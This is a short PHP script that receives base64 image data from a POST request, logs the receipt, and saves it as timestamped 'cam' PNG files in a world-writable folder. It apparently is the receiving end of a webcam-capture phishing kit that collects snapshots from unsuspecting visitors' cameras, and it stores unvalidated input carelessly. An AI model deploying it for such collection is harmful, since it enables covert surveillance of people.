<?php

$date = date('dMYHis');
$imageData = $_POST['cat'];

if (!empty($_POST['cat'])) {
    error_log("Received" . "\r\n", 3, "Log.log");
}

$filteredData = substr($imageData, strpos($imageData, ",") + 1);
$unencodedData = base64_decode($filteredData);


$folderPath = 'images/';
if (!is_dir($folderPath)) {
    mkdir($folderPath, 0777, true);
}

$filePath = $folderPath . 'cam' . $date . '.png';
$fp = fopen($filePath, 'wb');
fwrite($fp, $unencodedData);
fclose($fp);

exit();
?>
